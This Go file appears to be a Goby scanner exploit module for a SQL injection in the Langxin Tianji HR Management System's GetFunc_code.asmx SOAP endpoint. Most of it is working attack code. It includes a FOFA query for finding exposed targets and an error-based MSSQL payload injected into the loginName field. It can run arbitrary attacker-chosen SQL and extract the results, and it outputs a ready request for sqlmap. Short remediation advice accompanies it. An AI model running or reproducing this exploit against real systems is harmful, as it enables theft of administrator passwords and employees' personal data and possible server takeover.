package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Langxin Tianji Human Resource Management System GetFunc_code.asmx SQL Injection Vulnerability",
    "Description": "<p>The Langxin Tianji Human Resource Management System helps large enterprises solve the problems of human resource control, coordination, and resource sharing faced in the process of cross regional and multi-level group development. It is equipped with a powerful workflow engine to drive various complex human resource business processes and actually achieves rapid construction of business modules without the need for development. Based on the characteristics of talent selection, cultivation, utilization, and retention in large enterprises, this system enriches and improves the management of various businesses such as recruitment, training, performance, compensation, and competency.</p>",
    "Product": "Langxin Tianji Human Resource Management System",
    "Homepage": "http://www.hrsoft.com.cn/",
    "DisclosureDate": "2024-08-27",
    "PostTime": "2024-08-27",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "body=\"人力资源管理系统\" && body=\"Silverlight\" ",
    "GobyQuery": "body=\"人力资源管理系统\" && body=\"Silverlight\" ",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Please pay attention to the update status on the manufacturer's official website and install updated patches in a timely manner: <a href=\"http://www.hrsoft.com.cn/\">http://www.hrsoft.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "@@version",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "朗新天霁人力资源管理系统 GetFunc_code.asmx SQL注入漏洞",
            "Product": "朗新天霁人力资源管理系统",
            "Description": "<p>朗新天霁人力资源管理系统帮助大型企业解决跨地域、多层次集团发展过程中面临的人力资源管控、协调性、资源共享等问题，内置强大的工作流引擎驱动各大复杂的人力资源业务流程其实 并实现快速构建的业务模块而无须开发。结合大型企业对人才选、育、用、留的特点，本系统丰富并完善了招聘、培训、绩效、薪酬、能力素质等各项业务的管理。<br></p>",
            "Recommendation": "<p>1、请关注厂商官网更新状态，及时安装更新补丁：<a href=\"http://www.hrsoft.com.cn/\">http://www.hrsoft.com.cn/</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "HW-2024",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Langxin Tianji Human Resource Management System GetFunc_code.asmx SQL Injection Vulnerability",
            "Product": "Langxin Tianji Human Resource Management System",
            "Description": "<p>The Langxin Tianji Human Resource Management System helps large enterprises solve the problems of human resource control, coordination, and resource sharing faced in the process of cross regional and multi-level group development. It is equipped with a powerful workflow engine to drive various complex human resource business processes and actually achieves rapid construction of business modules without the need for development. Based on the characteristics of talent selection, cultivation, utilization, and retention in large enterprises, this system enriches and improves the management of various businesses such as recruitment, training, performance, compensation, and competency.<br></p>",
            "Recommendation": "<p>1. Please pay attention to the update status on the manufacturer's official website and install updated patches in a timely manner:&nbsp;<a href=\"http://www.hrsoft.com.cn/\">http://www.hrsoft.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "HW-2024",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9946"
}`

	setSqlPayloadx9WpI1Wwr9 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		headers := map[string]string{
			"Content-Type": "text/xml; charset=utf-8",
		}

		urlPost := "/ws/GetFunc_code.asmx"
		rawpayload := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetMessage xmlns=\"http://tempuri.org/\">\n      <loginName>1' and 1=(convert(int,(%s)))-- Bthm</loginName>\n    </GetMessage>\n  </soap:Body>\n</soap:Envelope>", sql)

		resp, err = setPostRequest(hostInfo, urlPost, rawpayload, headers)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/ws/GetFunc_code.asmx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "qvpxq1qpkxq"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113))"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `SQL Server`
			/*
				makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
					reRequest := regexp.MustCompile(RegularUrl)
					if !reRequest.MatchString(RegularContent) {
						return "", fmt.Errorf("can't match value")
					}
					getname := reRequest.FindStringSubmatch(RegularContent)
					return getname[1], nil
				}
			*/
			sendPayload := setSqlPayloadx9WpI1Wwr9
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nContent-Type: text/xml; charset=utf-8\nContent-Length: 1\nSOAPAction: \"http://tempuri.org/GetMessage\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetMessage xmlns=\"http://tempuri.org/\">\n      <loginName>1' and 1=(convert(int,((CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))))-- Bthm</loginName>\n    </GetMessage>\n  </soap:Body>\n</soap:Envelope>"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `'([\s\S]*?)'`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadx9WpI1Wwr9
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
